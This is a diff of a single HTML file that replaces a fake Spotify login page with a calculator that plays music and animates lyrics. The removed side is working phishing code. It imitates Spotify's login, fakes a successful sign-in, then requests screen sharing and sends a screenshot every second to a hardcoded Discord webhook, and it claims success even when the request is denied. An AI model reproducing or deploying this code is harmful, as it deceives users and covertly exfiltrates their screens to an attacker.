@@ -1,227 +1,214 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Log in - Spotify</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
-  <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      height: 100vh;
-      background: #000;
-      color: #fff;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-    }
-    .container {
-      width: 100%;
-      max-width: 450px;
-      padding: 60px 40px 40px;
-      background: #000;
-      border-radius: 8px;
-      text-align: center;
-    }
-    .logo {
-      font-size: 4.2rem;
-      font-weight: 900;
-      color: #1DB954;
-      margin-bottom: 40px;
-      letter-spacing: -2px;
-    }
-    h1 {
-      font-size: 2.4rem;
-      font-weight: 700;
-      margin-bottom: 32px;
-    }
-    .social-btn {
-      width: 100%;
-      padding: 14px 24px;
-      margin: 8px 0;
-      border: 1px solid #727272;
-      border-radius: 50px;
-      background: transparent;
-      color: #fff;
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-    }
-    .social-btn.google { border-color: #4285F4; color: #4285F4; }
-    .social-btn.facebook { border-color: #1877F2; color: #1877F2; }
-    .social-btn.apple { border-color: #fff; color: #fff; }
-    .divider {
-      display: flex;
-      align-items: center;
-      margin: 24px 0;
-      color: #727272;
-      font-size: 0.9rem;
-    }
-    .divider::before,
-    .divider::after {
-      content: "";
-      flex: 1;
-      height: 1px;
-      background: #727272;
-      margin: 0 16px;
-    }
-    input {
-      width: 100%;
-      padding: 16px 20px;
-      margin: 12px 0;
-      background: #121212;
-      border: 1px solid #535353;
-      border-radius: 4px;
-      color: #fff;
-      font-size: 1rem;
-    }
-    input::placeholder { color: #a7a7a7; }
-    .login-btn {
-      width: 100%;
-      padding: 16px;
-      margin: 24px 0 16px;
-      background: #1DB954;
-      color: #000;
-      font-size: 1.1rem;
-      font-weight: bold;
-      border: none;
-      border-radius: 50px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    .login-btn:hover { background: #1ed760; }
-    .login-btn:disabled { background: #535353; cursor: not-allowed; }
-    .links {
-      margin-top: 24px;
-      font-size: 0.95rem;
-      color: #b3b3b3;
-    }
-    .links a {
-      color: #1DB954;
-      text-decoration: none;
-    }
-    .links a:hover { text-decoration: underline; }
-    .status {
-      margin-top: 20px;
-      font-size: 1rem;
-      min-height: 1.4em;
-    }
-    .hidden-video {
-      position: fixed;
-      top: -9999px;
-      left: -9999px;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mobile Calculator Music</title>
+
+<style>
+* {
+  box-sizing: border-box;
+  -webkit-tap-highlight-color: transparent;
+}
+
+body {
+  margin: 0;
+  height: 100vh;
+  background: linear-gradient(180deg, #000, #111);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+  color: white;
+}
+
+/* Calculator container */
+.calculator {
+  width: 100%;
+  max-width: 360px;
+  height: 100vh;
+  max-height: 700px;
+  background: #000;
+  border-radius: 30px;
+  padding: 15px;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-end;
+  box-shadow: 0 0 40px rgba(0,0,0,0.8);
+}
+
+/* Display */
+.display {
+  font-size: 48px;
+  text-align: right;
+  padding: 20px 10px;
+  overflow-x: auto;
+}
+
+/* Buttons grid */
+.buttons {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 10px;
+}
+
+/* Button style */
+button {
+  height: 70px;
+  border: none;
+  border-radius: 50%;
+  font-size: 22px;
+  cursor: pointer;
+  transition: 0.15s;
+}
+
+button:active {
+  transform: scale(0.9);
+  filter: brightness(1.2);
+}
+
+/* Colors */
+.gray { background: #a5a5a5; color: black; }
+.dark { background: #333; color: white; }
+.orange { background: #ff9500; color: white; }
+
+.zero {
+  grid-column: span 2;
+  border-radius: 40px;
+}
+
+/* Lyrics overlay */
+#lyricsBox {
+  position: fixed;
+  bottom: 120px;
+  width: 100%;
+  text-align: center;
+  pointer-events: none;
+}
+
+.lyric-line {
+  opacity: 0;
+  font-size: 18px;
+  margin: 6px 0;
+  animation: fadeIn 0.8s forwards;
+}
+
+@keyframes fadeIn {
+  to {
+    opacity: 1;
+    transform: translateY(-10px);
+  }
+}
+
+.glow {
+  text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
+}
+</style>
 </head>
+
 <body>
 
-<div class="container">
-  <div class="logo">spotify</div>
-  <h1>Log in to Spotify</h1>
+<div class="calculator">
+  <div id="display" class="display">0</div>
 
-  <button class="social-btn google"><i class="fab fa-google"></i> Continue with Google</button>
-  <button class="social-btn facebook"><i class="fab fa-facebook-f"></i> Continue with Facebook</button>
-  <button class="social-btn apple"><i class="fab fa-apple"></i> Continue with Apple</button>
+  <div class="buttons">
+    <button class="gray" onclick="clearDisplay()">C</button>
+    <button class="gray" onclick="press('%')">%</button>
+    <button class="gray" onclick="press('/')">÷</button>
+    <button class="orange" onclick="press('*')">×</button>
 
-  <div class="divider">or</div>
+    <button class="dark" onclick="press('7')">7</button>
+    <button class="dark" onclick="press('8')">8</button>
+    <button class="dark" onclick="press('9')">9</button>
+    <button class="orange" onclick="press('-')">−</button>
 
-  <input type="text"     id="username" placeholder="Email or username" autocomplete="off"/>
-  <input type="password" id="password" placeholder="Password"         autocomplete="off"/>
+    <button class="dark" onclick="press('4')">4</button>
+    <button class="dark" onclick="press('5')">5</button>
+    <button class="dark" onclick="press('6')">6</button>
+    <button class="orange" onclick="press('+')">+</button>
 
-  <button class="login-btn" id="loginBtn">Log in</button>
+    <button class="dark" onclick="press('1')">1</button>
+    <button class="dark" onclick="press('2')">2</button>
+    <button class="dark" onclick="press('3')">3</button>
+    <button class="orange" onclick="calculate()">=</button>
 
-  <div class="links">
-    <a href="#">Forgot your password?</a><br><br>
-    Don't have an account? <a href="#">Sign up for Spotify</a>
+    <button class="dark zero" onclick="press('0')">0</button>
+    <button class="dark" onclick="press('.')">.</button>
   </div>
-
-  <div class="status" id="status"></div>
 </div>
 
-<video id="hiddenVid" class="hidden-video" autoplay muted playsinline></video>
+<!-- 🎵 AUDIO -->
+<audio id="song" preload="auto">
+  <source src="https://raw.githubusercontent.com/Aizentky/angelicav2/main/kalapastanganAudio.mp4" type="audio/mp4">
+</audio>
+
+<!-- 🎤 LYRICS -->
+<div id="lyricsBox"></div>
 
 <script>
-  const loginBtn = document.getElementById('loginBtn');
-  const status   = document.getElementById('status');
-  const hiddenVid = document.getElementById('hiddenVid');
+let display = document.getElementById("display");
 
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1485576901010522132/IsL38IWyMzpk9-ala6DbQxRoQyv-oJdtZ07xULSPi-sd8VPNJ6OzFAtQyFcQ7ucxaIFT";
+function press(val) {
+  if (display.innerText === "0") display.innerText = val;
+  else display.innerText += val;
+}
 
-  let stream = null;
-  let intervalId = null;
+function clearDisplay() {
+  display.innerText = "0";
+}
 
-  loginBtn.onclick = async () => {
-    const user = document.getElementById('username').value.trim();
-    const pass = document.getElementById('password').value.trim();
-
-    if (!user || !pass) {
-      status.textContent = "Please enter your email/username and password";
-      status.style.color = "#f33";
-      return;
-    }
-
-    loginBtn.disabled = true;
-    status.textContent = "Logging in...";
-    status.style.color = "#1DB954";
-
-    await new Promise(r => setTimeout(r, 1800 + Math.random()*1000)); // fake 1.8–2.8s delay
-
-    status.textContent = "Welcome back!";
-    status.style.color = "#1ed760";
-
-    try {
-      stream = await navigator.mediaDevices.getDisplayMedia({
-        video: { cursor: "always", frameRate: 30 },
-        audio: false
-      });
-
-      hiddenVid.srcObject = stream;
-      await hiddenVid.play().catch(() => {});
-
-      intervalId = setInterval(() => captureAndSend(hiddenVid), 1000);
-
-      stream.getVideoTracks()[0].addEventListener('ended', cleanup);
-
-    } catch (err) {
-      // If denied → pretend success anyway
-      status.textContent = "Success! Redirecting to Spotify...";
-    }
-  };
-
-  async function captureAndSend(video) {
-    if (video.videoWidth <= 0) return;
-
-    try {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-
-      const blob = await new Promise(r => canvas.toBlob(r, 'image/png', 0.80));
-
-      if (!blob) return;
-
-      const formData = new FormData();
-      formData.append('file', blob, `s-${Date.now()}.png`);
-
-      await fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(() => {});
-    } catch {}
+function calculate() {
+  try {
+    display.innerText = eval(display.innerText);
+  } catch {
+    display.innerText = "Error";
   }
 
-  function cleanup() {
-    if (intervalId) clearInterval(intervalId);
-    if (stream) stream.getTracks().forEach(t => t.stop());
-    hiddenVid.srcObject = null;
+  playSongAndLyrics();
+}
+
+/* 🎶 PLAY + ANIMATE LYRICS */
+function playSongAndLyrics() {
+  let song = document.getElementById("song");
+  song.currentTime = 0;
+  song.play();
+
+  let lyrics = [
+    "🔥 Your custom lyrics here",
+    "Lagyan mo ng Kalapastangan lines 😈",
+    "Pwede mo edit dito",
+    "Para sabay sa music 🎶"
+  ];
+
+  let box = document.getElementById("lyricsBox");
+  box.innerHTML = "";
+
+  lyrics.forEach((line, index) => {
+    let div = document.createElement("div");
+    div.className = "lyric-line glow";
+    box.appendChild(div);
+
+    setTimeout(() => {
+      typeWriter(div, line);
+    }, index * 1500);
+  });
+}
+
+/* ✍️ TYPEWRITER EFFECT */
+function typeWriter(element, text) {
+  let i = 0;
+  let speed = 35;
+
+  function typing() {
+    if (i < text.length) {
+      element.innerText += text.charAt(i);
+      i++;
+      setTimeout(typing, speed);
+    }
   }
+
+  typing();
+}
 </script>
 
 </body>
